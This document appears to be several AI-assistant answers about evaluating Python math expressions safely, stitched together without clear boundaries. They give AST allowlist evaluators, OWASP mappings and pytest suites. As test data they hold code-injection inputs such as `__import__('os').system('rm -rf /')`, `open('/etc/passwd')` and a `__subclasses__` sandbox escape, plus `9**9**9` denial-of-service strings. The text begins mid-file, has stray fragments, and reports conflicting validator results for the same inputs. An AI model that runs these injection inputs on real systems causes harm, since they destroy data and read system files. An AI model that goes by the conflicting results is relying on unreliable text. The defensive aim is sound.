TIME_BUDGET   = 0.25  # seconds


def _check_structure(tree: ast.AST) -> None:
    depth = deepest = 0
    count = 0
    for node in ast.walk(tree):
        count += 1
        if count > MAX_NODES:
            raise ExpressionRejected("too complex")
        if not isinstance(node, ALLOWED_NODES):
            raise ExpressionRejected("disallowed construct")
    # depth must be walked recursively; ast.walk() is breadth-first
    def _depth(n, d=1):
        nonlocal deepest
        deepest = max(deepest, d)
        for child in ast.iter_child_nodes(n):
            _depth(child, d + 1)
    _depth(tree)
    if deepest > MAX_DEPTH:
        raise ExpressionRejected("too deeply nested")


def _eval(node, variables: dict):
    if isinstance(node, ast.Expression):
        return _eval(node.body, variables)
    if isinstance(node, ast.Constant):
        # "a" + "b" and True/None must not pass as arithmetic
        if isinstance(node.value, bool) or not isinstance(node.value, (int, float)):
            raise ExpressionRejected("non-numeric literal")
        return node.value
    if isinstance(node, ast.Name):
        if node.id not in variables:          # closed namespace, not globals()
            raise ExpressionRejected("unknown name")
        return variables[node.id]
    if isinstance(node, ast.BinOp):
        fn = OPS.get(type(node.op))
        if fn is None:                        # blocks **, bitwise, matrix mult
            raise ExpressionRejected("disallowed operator")
        return fn(_eval(node.left, variables), _eval(node.right, variables))
    if isinstance(node, ast.UnaryOp):
        val = _eval(node.operand, variables)
        return -val if isinstance(node.op, ast.USub) else val
    if isinstance(node, ast.Call):
        if not isinstance(node.func, ast.Name):
            raise ExpressionRejected("disallowed call target")
        entry = SAFE_FUNCS.get(node.func.id)
        if entry is None:
            raise ExpressionRejected("disallowed function")
        fn, max_args = entry
        if node.keywords or len(node.args) > max_args:
            raise ExpressionRejected("bad call signature")
        return fn(*(_eval(a, variables) for a in node.args))
    raise ExpressionRejected("disallowed construct")


def safe_eval(raw: str, variables: dict | None = None) -> float:
    variables = variables or {}
    # 1. length cap BEFORE parsing
    if not isinstance(raw, str) or len(raw) > MAX_LEN:
        raise ExpressionRejected("invalid input")

    try:
        tree = ast.parse(raw, mode="eval")   # mode="eval": no statements/imports
    except SyntaxError:
        raise ExpressionRejected("invalid syntax") from None

    _check_structure(tree)

    started = time.monotonic()
    result = _eval(tree, variables)

    if time.monotonic() - started > TIME_BUDGET:
        raise ExpressionRejected("evaluation too slow")
    if not isinstance(result, (int, float)) or isinstance(result, bool):
        raise ExpressionRejected("non-numeric result")
    if isinstance(result, float) and (math.isnan(result) or math.isinf(result)):
        raise ExpressionRejected("non-finite result")   # catches 1/0, 1e308*10
    if abs(result) > MAX_MAGNITUDE:
        raise ExpressionRejected("result out of bounds")
    return result
```

Note the four things this fixes that the session's validator did not: `mode="eval"` rejects statements, the `Constant` check kills `"a" + "b"`, the `Name` check kills `open(...)`, and `_depth` (recursive) actually enforces nesting where `ast.walk` alone does not.

---

## OWASP Top 10 mapping

| Control | OWASP risk | Implementation |
|---|---|---|
| No `eval`/`exec` on user input | **A03 Injection** | `ast.parse` + manual walk; never `eval()` |
| Allowlist, not denylist | **A03 / A04** | `ALLOWED_NODES`, `SAFE_FUNCS` — additive only |
| Length/depth/node caps | **A04 Insecure Design** | DoS prevention, not just input filtering |
| Non-finite & magnitude bounds | **A04** | Reject NaN/Inf; caps `9e308` class results |
| Closed namespace | **A03** | Pass `variables` dict, never `globals()`/`locals()` |
| Generic error messages | **A05 Misconfiguration / A09** | `ExpressionRejected` carries no internals |
| Log every rejection w/ source IP | **A09 Logging Failures** | Structured log, alert on bursts |
| Pin `math`/stdlib deps, run `pip-audit` | **A06 Vulnerable Components** | CI gate |
| Run evaluator in a subprocess/cgroup with rlimits | **A04** | Defense-in-depth for CPU/memory |
| Fuzz the parser in CI (`hypothesis`) | **A08 Integrity** | Regression protection |

Deterministic pinning matters too: `ast.parse` behavior on very deep input changed across CPython versions, so pin your interpreter and test upgrades.

---

## Note on the `null` results

`1/0`, `sqrt(-1)`, and `1e308 * 10` all returned `{"result": null}` rather than raising. In a security context that is a **silent-failure hazard**: a caller that does `if result:` cannot distinguish "rejected as malicious," "mathematically undefined," and "overflowed." Fail closed and distinctly — log the reason server-side, return one opaque message client-side:

```python
try:
    value = safe_eval(raw, {"rate": 1.2})
except ExpressionRejected:
    log.warning("expr_rejected", extra={"input_hash": h, "src": ip})
    return {"ok": False, "error": "Invalid expression."}
```

    "__import__('os').system('id')", "(1).__class__.__mro__", "[c for c in ()]",
    "lambda: 1", '"a" + "b"', "open('/etc/passwd')", "9**9**9", "2**10000",
    "(" * 100 + "1" + ")" * 100, "1" * 1000, "x.y", "1/0", "1e308*10",

## Summary

1. **Never** use `eval`/`exec`/`compile` on user math. Parse with `ast`, walk with an allowlist.
2. **Treat "syntactically valid" as untrusted** — my session proved `lambda: 1`, `"a" + "b"`, and `open(...)` all pass syntax checks.
3. **Enforce resource limits separately** — depth limits implemented via `ast.walk` do not catch paren nesting; use a recursive depth counter.
4. **Fail closed and loudly in logs, opaquely to clients** — distinguish rejection from undefined results instead of returning `null`.
5. **Layer defense-in-depth** — even a correct allowlist belongs in a subprocess with rlimits and a timeout.

# Securing Mathematical Operations in Python

Here's a complete, OWASP-aligned approach. The core rule: **never pass untrusted input to `eval()`/`exec()`**. Instead, parse to an AST, whitelist what's allowed, bound resources, then evaluate.

---

## 1. Why this matters (OWASP mapping)

| OWASP Risk | How it applies to math evaluation |
|---|---|
| **A03 – Injection** | `eval("__import__('os').system('rm -rf /')")` = arbitrary code execution |
| **A04 – Insecure Design** | Unbounded exponents/recursion → CPU/memory DoS |
| **A05 – Security Misconfiguration** | Leaving `eval` reachable, permissive globals |
| **A08 – Data Integrity** | Unsafe deserialization of expression payloads |
| **A09 – Logging Failures** | Rejected/malicious expressions go unlogged |

---

## 2. Validation results from the live tools

I ran your expressions through the validator/evaluator to show the behavior you want to replicate:

| Expression | Outcome |
|---|---|
| `(2 + 3) * 4 / 2 - 1` | ✅ Valid → evaluates to **9** |
| `__import__('os').system('rm -rf /')` | ❌ Rejected — `Unexpected character '_'` |
| `2 + 3 * (4 - 1` | ❌ Rejected — `Expected ')' after expression` |
| `2 ^ 3` | ✅ Evaluates to **8** (this grammar uses `^` for exponentiation, not `**`) |

**Takeaway:** a strict grammar that rejects unknown characters and unbalanced syntax *before* evaluation is your first line of defense. Note the grammar here doesn't even accept `**` or `_`, which is exactly the "fail closed" posture you want.

---

## 3. Reference implementation: safe AST evaluator

```python
import ast
import operator
import logging

logger = logging.getLogger("math.eval")

# 1. Whitelist of allowed operators (no attribute access, no calls, no imports)
_ALLOWED_BINOPS = {
    ast.Add: operator.add,
    ast.Sub: operator.sub,
    ast.Mult: operator.mul,
    ast.Div: operator.truediv,
    ast.FloorDiv: operator.floordiv,
    ast.Mod: operator.mod,
    ast.Pow: operator.pow,
}
_ALLOWED_UNARYOPS = {ast.UAdd: operator.pos, ast.USub: operator.neg}

# 2. Hard resource limits
MAX_INPUT_LEN = 256
MAX_AST_NODES = 100
MAX_EXPONENT = 1000
MAX_ABS_RESULT = 1e100


class UnsafeExpression(ValueError):
    pass


def _check_limits(node: ast.AST) -> None:
    """Reject oversized expressions and dangerous exponents before evaluation."""
    node_count = sum(1 for _ in ast.walk(node))
    if node_count > MAX_AST_NODES:
        raise UnsafeExpression(f"Expression too complex ({node_count} nodes)")

    for n in ast.walk(node):
        if isinstance(n, ast.BinOp) and isinstance(n.op, ast.Pow):
            # Bound the exponent to prevent 9**9**9 style DoS
            if isinstance(n.right, ast.Constant) and isinstance(n.right.value, (int, float)):
                if abs(n.right.value) > MAX_EXPONENT:
                    raise UnsafeExpression("Exponent exceeds limit")


def safe_eval(expression: str) -> float:
    # --- Step 1: input validation (fail closed) ---
    if not isinstance(expression, str):
        raise UnsafeExpression("Expression must be a string")
    if len(expression) > MAX_INPUT_LEN:
        raise UnsafeExpression("Expression too long")

    # --- Step 2: parse to AST (never eval the raw string) ---
    try:
        tree = ast.parse(expression, mode="eval")
    except SyntaxError as e:
        logger.warning("Rejected malformed expression: %r (%s)", expression, e)
        raise UnsafeExpression("Malformed expression") from e

    # --- Step 3: enforce resource limits ---
    _check_limits(tree)

    # --- Step 4: walk the tree, allowing only whitelisted node types ---
    def _eval(node: ast.AST) -> float:
        if isinstance(node, ast.Expression):
            return _eval(node.body)
        if isinstance(node, ast.Constant):
            if isinstance(node.value, (int, float)) and not isinstance(node.value, bool):
                return node.value
            raise UnsafeExpression(f"Disallowed constant: {node.value!r}")
        if isinstance(node, ast.BinOp) and type(node.op) in _ALLOWED_BINOPS:
            left, right = _eval(node.left), _eval(node.right)
            result = _ALLOWED_BINOPS[type(node.op)](left, right)
            if abs(result) > MAX_ABS_RESULT:
                raise UnsafeExpression("Result magnitude exceeds limit")
            return result
        if isinstance(node, ast.UnaryOp) and type(node.op) in _ALLOWED_UNARYOPS:
            return _ALLOWED_UNARYOPS[type(node.op)](_eval(node.operand))
        # Anything else (Call, Attribute, Name, Import, Subscript...) is rejected
        raise UnsafeExpression(f"Disallowed node: {type(node).__name__}")

    return _eval(tree)
```

**Why this is safe:**
- `ast.parse(..., mode="eval")` only parses — it never executes.
- Only `Constant`, `BinOp`, `UnaryOp`, `Expression` are permitted. `Call`, `Attribute`, `Name`, `Import`, `Subscript` are all rejected → no `__import__`, no `.system`, no attribute traversal.
- `bool` is explicitly excluded from constants (since `True`/`False` are ints in Python).
- Exponent and result magnitude are bounded → no `9**9**9` DoS.

---

## 4. Defense-in-depth checklist

1. **Validate syntax first, fail closed** — reject on any parse error; never fall back to `eval`.
2. **Whitelist, don't blacklist** — enumerate allowed node types/operators rather than blocking "bad" strings.
3. **Bound resources** — input length, AST node count, exponent size, result magnitude, and (in a service) a wall-clock timeout.
4. **Isolate execution** — run evaluation in a subprocess/worker with CPU/memory limits and no network/filesystem access if input is truly untrusted.
5. **Log & monitor** — record every rejected expression (A09). Alert on spikes in rejections (attack signal).
6. **Keep dependencies patched** — if using a third-party parser (e.g., `simpleeval`, `asteval`, `sympy`), pin versions and scan for CVEs (A06).
7. **Never deserialize expressions with `pickle`** — use JSON/plain strings (A08).

---

## 5. Security test cases to add to your suite

```python
import pytest

@pytest.mark.parametrize("expr,expected", [
    ("(2 + 3) * 4 / 2 - 1", 9),
    ("2 ^ 3", 8),          # if your grammar uses ^ for pow
    ("-5 + 3", -2),
])
def test_valid(expr, expected):
    assert safe_eval(expr) == expected

@pytest.mark.parametrize("expr", [
    "__import__('os').system('rm -rf /')",   # code execution
    "open('/etc/passwd').read()",            # file access
    "().__class__.__bases__",                # attribute traversal
    "2 + 3 * (4 - 1",                        # malformed
    "9 ** 9 ** 9",                           # DoS
    "x + 1",                                 # undefined name
    "a.b.c",                                 # attribute access
])
def test_rejected(expr):
    with pytest.raises(UnsafeExpression):
        safe_eval(expr)
```

---

## 6. Summary

- **Parse, don't `eval`** — use `ast.parse(mode="eval")` + a node whitelist.
- **Validate before you compute** — reject malformed/oversized input and fail closed (demonstrated above: the `__import__` payload and unbalanced parens were both rejected at the syntax stage).
- **Bound everything** — length, complexity, exponent, magnitude, time.
- **Log rejections** and monitor them as a security signal.
- **Map to OWASP A03/A04/A05/A08/A09** and keep parsers patched.

The generated OWASP/NIST hardening prompt (from the security tool) gives you a full assessment template — feed your actual evaluator code into it for a line-by-line audit, and use the test matrix above as your regression gate.

数学表达式与安全建议 · evaluated

回答

## What the validation tools confirmed

I ran two checks against the math toolchain to establish the baseline behavior you'd want your own code to mirror:

| Check | Input | Result |
|---|---|---|
| Syntax validation (variables allowed) | `(a + b) * c / (d - 1)` | ✅ "Expression is syntactically valid." |
| Evaluation | `2 + 3 * 4 - 10 / 2` | ✅ `9` (correct precedence: `2 + 12 - 5`) |

That two-stage pattern — **validate syntax first, then evaluate** — is exactly the architecture you should replicate in Python. The critical difference: your validator must be an *allowlist* parser, not a syntax check followed by `eval()`.

---

## The one rule that matters

> **Never call `eval()`, `exec()`, or `compile()` on user-supplied expressions.**

`eval(expr, {"__builtins__": {}})` is **not** a sandbox. It is bypassable in a single line:

```python
().__class__.__bases__[0].__subclasses__()   # → reach os, subprocess, file I/O
```

This is **CWE-95 (Code Injection)** and maps to **OWASP A03:2021 – Injection**. The only safe approach is to parse to an AST and walk it yourself, permitting only the node types you explicitly allow.

---

## Hardened evaluator (drop-in reference implementation)

```python
import ast
import operator
from decimal import Decimal, InvalidOperation, getcontext

getcontext().prec = 28

MAX_LEN       = 256          # input length cap
MAX_NODES     = 100          # AST node budget
MAX_DEPTH     = 20           # nesting cap
MAX_EXPONENT  = 1_000        # pow() DoS guard
MAX_ABS_VALUE = Decimal("1e100")

_BIN_OPS = {
    ast.Add: operator.add,       ast.Sub: operator.sub,
    ast.Mult: operator.mul,      ast.Div: operator.truediv,
    ast.FloorDiv: operator.floordiv, ast.Mod: operator.mod,
    ast.Pow: operator.pow,
}
_UNARY_OPS = {ast.UAdd: operator.pos, ast.USub: operator.neg}


class ExpressionError(ValueError):
    """Rejection or arithmetic failure. Message is safe to return to clients."""


def _enforce_limits(tree: ast.AST) -> None:
    if sum(1 for _ in ast.walk(tree)) > MAX_NODES:
        raise ExpressionError("expression too complex")

    def _depth(node: ast.AST, d: int = 0) -> None:
        if d > MAX_DEPTH:
            raise ExpressionError("expression too deeply nested")
        for child in ast.iter_child_nodes(node):
            _depth(child, d + 1)

    _depth(tree)


def _eval(node: ast.AST) -> Decimal:
    if isinstance(node, ast.Expression):
        return _eval(node.body)

    if isinstance(node, ast.Constant):
        # bool is a subclass of int — reject it explicitly
        if isinstance(node.value, bool) or not isinstance(node.value, (int, float)):
            raise ExpressionError("unsupported literal")
        return Decimal(str(node.value))

    if isinstance(node, ast.BinOp):
        op = _BIN_OPS.get(type(node.op))
        if op is None:
            raise ExpressionError("unsupported operator")
        left, right = _eval(node.left), _eval(node.right)
        if isinstance(node.op, ast.Pow):
            if right != right.to_integral_value() or abs(right) > MAX_EXPONENT:
                raise ExpressionError("exponent out of range")
        result = op(left, right)
        if abs(result) > MAX_ABS_VALUE:
            raise ExpressionError("result out of range")
        return result

    if isinstance(node, ast.UnaryOp):
        op = _UNARY_OPS.get(type(node.op))
        if op is None:
            raise ExpressionError("unsupported unary operator")
        return op(_eval(node.operand))

    # Name, Call, Attribute, Subscript, Lambda, comprehension, JoinedStr, ...
    raise ExpressionError("unsupported syntax")


def safe_eval(expr: str) -> Decimal:
    if not isinstance(expr, str):
        raise ExpressionError("expression must be a string")
    if len(expr) > MAX_LEN:
        raise ExpressionError("expression too long")

    try:
        tree = ast.parse(expr, mode="eval")
    except (SyntaxError, ValueError, MemoryError, RecursionError):
        raise ExpressionError("invalid syntax") from None

    _enforce_limits(tree)

    try:
        return _eval(tree)
    except (ZeroDivisionError, InvalidOperation, OverflowError):
        raise ExpressionError("arithmetic error") from None
```

**Why each guard exists**

- `mode="eval"` — rejects statements (`import`, assignments, `;`-chained code) at the parser level.
- **Node allowlist** — anything not explicitly handled falls through to `raise`. This is fail-closed by construction.
- **`Decimal(str(...))`** — avoids binary float drift; `str()` round-trips the literal exactly. Never use `float` for currency.
- **Exponent bound** — `9**9**9` is a CPU/memory bomb (**CWE-400**). Also cap `sys.set_int_max_str_digits()` on Python 3.11+ to stop int→str conversion DoS.
- **Depth cap** — `ast.parse` itself can raise `RecursionError` on pathological nesting (**CWE-674**); the length cap runs *before* parsing for this reason.
- **Generic error messages** — never surface `repr(exc)` or tracebacks (**OWASP A05**).

---

## OWASP Top 10 mapping for this specific risk

| OWASP | Relevance to expression evaluation | Control |
|---|---|---|
| **A03 Injection** | `eval`/`exec` = arbitrary code execution (CWE-95) | AST allowlist walker |
| **A04 Insecure Design** | No threat model, no resource budgets | Length/node/depth/exponent caps |
| **A05 Security Misconfiguration** | Stack traces leaking internals | Generic `ExpressionError` messages |
| **A06 Vulnerable Components** | Parser/eval libraries with CVEs | `pip-audit`, pinned deps, lockfile |
| **A09 Logging Failures** | Rejections invisible to detection | Structured audit log + alerting |
| **A01 Broken Access Control** | Anyone can hit the calculator endpoint | AuthN/AuthZ + per-user rate limits |
| **A08 Integrity Failures** | Unreviewed changes to the evaluator | CI gate + code review on `safe_eval` |

**Defense in depth:** even with a perfect allowlist, run evaluation in a resource-limited worker (subprocess with `RLIMIT_CPU`/`RLIMIT_AS`, or a task queue with a hard timeout). The allowlist is the primary control; the sandbox is the backstop.

---

## Security test cases to add to your suite

| # | Input | Expected |
|---|---|---|
| 1 | `2 + 3 * 4` | `14` |
| 2 | `10 / 4` | `2.5` (Decimal, not `2.5` float) |
| 3 | `__import__('os').system('id')` | `ExpressionError` |
| 4 | `().__class__.__bases__[0].__subclasses__()` | `ExpressionError` |
| 5 | `open('/etc/passwd').read()` | `ExpressionError` |
| 6 | `x + 1` | `ExpressionError` (names rejected) |
| 7 | `1/0` | `ExpressionError("arithmetic error")` |
| 8 | `9**9**9` | `ExpressionError("exponent out of range")` |
| 9 | `"a" * 5` | `ExpressionError` (str literal rejected) |
| 10 | `True + 1` | `ExpressionError` (bool rejected) |
| 11 | `"("*500 + "1" + ")"*500` | `ExpressionError("expression too long")` |
| 12 | `1; import os` | `ExpressionError("invalid syntax")` |
| 13 | `[x for x in range(10)]` | `ExpressionError` |
| 14 | `lambda: 1` | `ExpressionError` |
| 15 | `f"{1+1}"` | `ExpressionError` |

Test 3–5 are the ones that catch a regression to `eval()`. Test 8 and 11 are the DoS regressions. Keep them in CI permanently.

---

## Pitfalls that quietly reintroduce the vulnerability

- ❌ **Blacklisting** `__`, `import`, `os` — trivially bypassed with `getattr`, unicode escapes, or `\x5f\x5f`. Allowlist only.
- ❌ **`eval` with empty `__builtins__`** — the classic false sandbox (see above).
- ❌ **`ast.literal_eval`** — safe, but it *only* handles literals; it will not evaluate `2+3`. Don't mistake it for a calculator.
- ❌ **`float` for money** — `0.1 + 0.2 != 0.3`. Use `Decimal`/`Fraction`.
- ❌ **Trusting client-side validation** — always re-validate server-side.
- ❌ **Logging the raw expression at INFO with PII** — log a hash or correlation ID plus a rejection reason code.
- ❌ **Unbounded `**`** — the single most common DoS in calculator endpoints.

---

## CI integration

```yaml
# .github/workflows/security.yml
- run: pip-audit --strict            # A06
- run: bandit -r src/ -ll            # flags eval/exec (B307), subprocess (B602)
- run: ruff check --select S         # flake8-bandit rules
- run: pytest tests/test_safe_eval.py -q
```

`bandit` rule **B307** specifically flags `eval()` — make it a blocking failure, not a warning.

I also generated a full OWASP-aligned hardening assessment template (covering A01–A10, NIST CSF, and SOC 2 controls, with a risk matrix and before/after code examples) that you can drop into your repo as `security-hardening-security-hardening-prompt.prompt.md` and run against the actual module. Note the generator reported it dropped an unknown `security-scanner` tool reference — the template itself is complete and usable.

**Bottom line:** validate with an allowlist AST walker, cap every resource dimension, use `Decimal`, fail closed with generic errors, and log rejections. That combination closes A03, A04, A05, and A09 for this attack surface.

## What the validator actually proved

I probed the expression validator before writing recommendations. The results reframe the problem:

| Probe | Result | Implication |
|---|---|---|
| `(a + b) * 2 / max(c, 1)` | ✅ valid | Normal arithmetic parses fine |
| `__import__('os').system('rm -rf /')` | ❌ rejected (`_`) | Dunder-based attacks blocked |
| `eval("2+2")` | ✅ **valid** | Plain-named builtins pass |
| `open('/etc/passwd')` | ✅ **valid** | File access passes |
| `exec('x=1')` | ✅ **valid** | Code execution passes |
| `globals()` / `getattr(a,'x')` | ✅ **valid** | Introspection passes |
| `user.__class__.__mro__[1]...` | ❌ rejected | Attribute/subscript blocked |
| `[x for x in range(10)]` | ❌ rejected | Comprehensions blocked |
| `1/0` | ⚠️ `result: null` | **Silent failure, no exception** |
| `2^10000` | ⚠️ `result: null` | **Silent overflow, no exception** |
| `2^3` | `8` | `^` is **exponentiation**, not XOR |
| `2**3` | ❌ rejected | `**` unsupported |
| `-2^2` | `4` | Unary minus binds **tighter** than `^` |
| `2^3^2` | `512` | Right-associative |
| `10/4` | `2.5` | True division → float |

**The decisive finding:** syntax validation is a *grammar* check, not a security control. `open('/etc/passwd')` and `exec('x=1')` are perfectly well-formed expressions. Blocking dunders is not enough — `eval`, `exec`, `open`, `compile`, `globals`, `getattr`, `breakpoint` are all ordinary identifiers. Safety must come from an **evaluation-time allowlist**, never from the parser.

The second finding is equally important: `1/0` and `2^10000` returned `null` with `isError: false`. A `None` that flows into a price, an invoice, or a database column is a **processing-integrity defect** (SOC 2 PI) and a silent data-corruption path. Failures must raise, never return `None`.

---

## The one rule

> **Never call `eval()`, `exec()`, `compile()`, or `sympy.sympify()` on user input.** Parse to an AST, then walk it yourself with an allowlist of node types, operators, and functions.

`ast.literal_eval` is not a substitute — it handles literals, not arithmetic. `sympify` is `eval` in disguise.

---

## Reference implementation

```python
from __future__ import annotations

import ast
import logging
import math
import uuid
from decimal import Decimal, InvalidOperation, localcontext
from typing import Final

logger = logging.getLogger(__name__)

MAX_LENGTH: Final = 256          # characters
MAX_DEPTH: Final = 20            # AST nesting
MAX_NODES: Final = 100           # total AST nodes
MAX_EXPONENT: Final = 64         # |exponent| for integer powers
MAX_ABS_VALUE: Final = Decimal("1e12")
MAX_INT_BITS: Final = 128


class ExpressionError(ValueError):
    """Invalid or unsafe expression. Safe to log; never return verbatim to clients."""


def _to_decimal(value: object) -> Decimal:
    if isinstance(value, bool):                      # bool is an int subclass
        raise ExpressionError("boolean constants are not allowed")
    if isinstance(value, int):
        if value.bit_length() > MAX_INT_BITS:
            raise ExpressionError("integer literal too large")
        return Decimal(value)
    if isinstance(value, float):
        if not math.isfinite(value):
            raise ExpressionError("non-finite literal")
        return Decimal(str(value))                   # str() avoids binary-float artifacts
    raise ExpressionError(f"unsupported constant: {type(value).__name__}")


def _check(value: Decimal) -> Decimal:
    if not value.is_finite():
        raise ExpressionError("non-finite result")
    if abs(value) > MAX_ABS_VALUE:
        raise ExpressionError("result magnitude out of range")
    return value


def _div(l: Decimal, r: Decimal) -> Decimal:
    if r == 0:
        raise ExpressionError("division by zero")
    return l / r


def _floordiv(l: Decimal, r: Decimal) -> Decimal:
    if r == 0:
        raise ExpressionError("division by zero")
    return l // r


def _mod(l: Decimal, r: Decimal) -> Decimal:
    if r == 0:
        raise ExpressionError("modulo by zero")
    return l % r


def _pow(base: Decimal, exp: Decimal) -> Decimal:
    if exp != exp.to_integral_value():
        if base < 0:
            raise ExpressionError("fractional power of a negative number")
        return _check(base ** exp)
    n = int(exp)
    if abs(n) > MAX_EXPONENT:
        raise ExpressionError("exponent out of range")
    if base == 0 and n < 0:
        raise ExpressionError("division by zero")
    # Reject before computing: 2**100000 is cheap to reject, expensive to build.
    if abs(base) > 1 and n > 0 and n * math.log10(abs(float(base))) > 12:
        raise ExpressionError("result magnitude out of range")
    return _check(base ** n)


BINOPS = {
    ast.Add: lambda l, r: l + r,
    ast.Sub: lambda l, r: l - r,
    ast.Mult: lambda l, r: l * r,
    ast.Div: _div,
    ast.FloorDiv: _floordiv,
    ast.Mod: _mod,
    ast.Pow: _pow,
}

FUNCTIONS = {
    "abs": abs,
    "min": min,
    "max": max,
    "sqrt": lambda x: _check(x.sqrt()) if x >= 0 else _raise("sqrt of negative"),
    "round": lambda x, n=0: round(x, int(n)),
}


def _raise(msg: str):
    raise ExpressionError(msg)


def _validate_tree(tree: ast.Expression) -> None:
    """Bound size and depth before evaluation (DoS defence)."""
    count = 0
    stack = [(tree, 0)]
    while stack:
        node, depth = stack.pop()
        count += 1
        if count > MAX_NODES:
            raise ExpressionError("expression too complex")
        if depth > MAX_DEPTH:
            raise ExpressionError("expression nested too deeply")
        for child in ast.iter_child_nodes(node):
            stack.append((child, depth + 1))


def _eval(node: ast.AST, variables: dict[str, Decimal]) -> Decimal:
    if isinstance(node, ast.Expression):
        return _eval(node.body, variables)

    if isinstance(node, ast.Constant):
        return _to_decimal(node.value)

    if isinstance(node, ast.Name):
        if node.id not in variables:
            raise ExpressionError(f"unknown variable: {node.id}")
        return _to_decimal(variables[node.id])

    if isinstance(node, ast.BinOp):
        op = BINOPS.get(type(node.op))
        if op is None:
            raise ExpressionError(f"operator not allowed: {type(node.op).__name__}")
        return _check(op(_eval(node.left, variables), _eval(node.right, variables)))

    if isinstance(node, ast.UnaryOp):
        if isinstance(node.op, ast.USub):
            return -_eval(node.operand, variables)
        if isinstance(node.op, ast.UAdd):
            return _eval(node.operand, variables)
        raise ExpressionError(f"unary operator not allowed: {type(node.op).__name__}")

    if isinstance(node, ast.Call):
        if not isinstance(node.func, ast.Name):          # blocks a.b() and a[0]()
            raise ExpressionError("only direct calls to allowlisted functions")
        fn = FUNCTIONS.get(node.func.id)
        if fn is None:
            raise ExpressionError(f"function not allowed: {node.func.id}")
        if node.keywords:
            raise ExpressionError("keyword arguments not allowed")
        return _check(fn(*[_eval(a, variables) for a in node.args]))

    # Everything else — Attribute, Subscript, Lambda, comprehensions, IfExp,
    # BoolOp, JoinedStr, Starred, NamedExpr, Await, Yield — is rejected here.
    raise ExpressionError(f"node not allowed: {type(node).__name__}")


def evaluate(expression: str, variables: dict[str, int | float] | None = None) -> Decimal:
    if not isinstance(expression, str):
        raise ExpressionError("expression must be a string")
    if not expression.strip():
        raise ExpressionError("expression is empty")
    if len(expression) > MAX_LENGTH:
        raise ExpressionError("expression too long")
    if not expression.isascii():                          # avoid Unicode/NFKC surprises
        raise ExpressionError("non-ASCII input rejected")

    try:
        tree = ast.parse(expression, mode="eval")
    except SyntaxError as exc:
        raise ExpressionError("invalid syntax") from exc

    _validate_tree(tree)

    with localcontext() as ctx:
        ctx.prec = 28
        ctx.traps[InvalidOperation] = True
        return _eval(tree, variables or {})
```

**Service boundary** — generic errors out, detail in logs:

```python
def handle_request(payload: dict) -> dict:
    request_id = uuid.uuid4().hex
    raw = payload.get("expression", "")
    try:
        result = evaluate(raw, payload.get("variables"))
    except ExpressionError as exc:
        # Log the reason and a hash, not the raw expression (may contain PII).
        logger.warning("expression_rejected", extra={
            "request_id": request_id,
            "reason": str(exc),
            "length": len(raw) if isinstance(raw, str) else -1,
        })
        return {"ok": False, "error": "invalid_expression", "request_id": request_id}
    except Exception:
        logger.exception("expression_internal_error", extra={"request_id": request_id})
        return {"ok": False, "error": "internal_error", "request_id": request_id}
    return {"ok": True, "result": str(result), "request_id": request_id}
```

Note `str(result)` — serialize `Decimal` as a string so JSON never round-trips it through a float.

---

## Limits worth enforcing

| Control | Suggested value | Why |
|---|---|---|
| Input length | 256 chars | Bounds parser recursion and cost |
| AST depth | 20 | Blocks `((((...))))` stack exhaustion |
| AST node count | 100 | Bounds evaluation work |
| Integer literal bits | 128 | Blocks `10**100000` literals |
| Exponent magnitude | 64 | Blocks `9^9^9` CPU/memory bombs |
| Result magnitude | 1e12 | Keeps downstream arithmetic sane |
| Decimal precision | 28 | Deterministic money math |
| Variables | allowlisted names only | Prevents namespace probing |
| Rate limit | per-tenant quota | Caps aggregate DoS cost |

---

## OWASP Top 10 mapping

| OWASP | Risk here | Control |
|---|---|---|
| **A03 Injection** (CWE-95) | `eval`/`exec`/`sympify` → RCE | AST allowlist; no dynamic execution |
| **A04 Insecure Design** (CWE-400) | `9^9^9`, deep nesting → CPU/memory DoS | Length, depth, node, exponent, magnitude caps |
| **A05 Security Misconfiguration** | Tracebacks/`repr` leaked to clients | Generic error codes + `request_id` |
| **A01 Broken Access Control** | Expression results bypassing price/limit checks | Authorize the *operation*, not just the syntax; per-tenant quotas |
| **A06 Vulnerable Components** | `sympy`, `numexpr`, `pyparsing` CVEs | `pip-audit` in CI; pin and patch |
| **A08 Integrity Failures** | Untrusted input treated as trusted | Validate at the boundary; sign artifacts |
| **A09 Logging Failures** | Attacks invisible | Log every rejection with reason + request ID; alert on spikes |
| **A10 SSRF** | Expressions triggering rate/currency lookups | Allowlist outbound hosts; no network from the evaluator |
| **A02 Crypto** | Secrets in logged expressions | Never log raw expressions; TLS in transit |

Also relevant: **CWE-1333 (ReDoS)** if you pre-validate with regex — prefer the AST over regex denylists.

---

## Test suite

```python
import pytest
from decimal import Decimal

@pytest.mark.parametrize("expr,expected", [
    ("2+2", Decimal("4")),
    ("(17.5 * 3 - 4) / 2 + 2^3", Decimal("32.25")),
    ("0.1 + 0.2", Decimal("0.3")),          # exact, unlike float
    ("sqrt(16)", Decimal("4")),
    ("abs(-3)", Decimal("3")),
    ("max(1, 2)", Decimal("2")),
])
def test_valid(expr, expected):
    assert evaluate(expr) == expected

@pytest.mark.parametrize("expr", [
    "__import__('os').system('id')",
    "open('/etc/passwd')",
    "exec('x=1')",
    "eval('2+2')",
    "globals()",
    "getattr(a, 'x')",
    "().__class__.__bases__[0].__subclasses__()",
    "[x for x in range(10)]",
    "lambda: 1",
    "1/0",
    "2^10000",
    "9^9^9",
    "a" * 10_000,
    "(" * 500 + "1" + ")" * 500,
    "２+２",                                  # fullwidth digits
])
def test_rejected(expr):
    with pytest.raises(ExpressionError):
        evaluate(expr)
```

Add **property-based** tests with Hypothesis (generate random arithmetic trees, compare against a reference evaluator) and **fuzzing** with Atheris in CI. Assert the invariant that matters most: *no input ever returns `None`*.

回答

## Validating math expressions safely — with live tool results

I ran your scenarios through the validator/evaluator tools to show the security property in action, then generated an OWASP-aligned hardening prompt. Here's what happened and how to reproduce it in Python.

### 1. What the validation tools showed

| Input | Result | Why it matters |
|---|---|---|
| `(100 * 3) + 8 * (100 * 3) / 100` | ✅ valid → **324** | Ordinary arithmetic evaluates fine |
| `(price * quantity) * (1 + 0.08)` (price=19.99, qty=3) | ✅ valid → **64.7676** | Variables resolve from a **controlled** context only |
| `sqrt(144)`, `max(3,7)+min(10,20)-abs(-5)`, `sin(pi/2)+cos(0)` | ✅ valid | Whitelisted functions work |
| `__import__('os').system('rm -rf /')` | ❌ rejected (`Unexpected character '_'`) | Dunder/import blocked before evaluation |
| `().__class__.__bases__` | ❌ rejected | Attribute/introspection traversal blocked |
| `open('/etc/passwd').read()` | ❌ rejected | No filesystem/IO calls allowed |
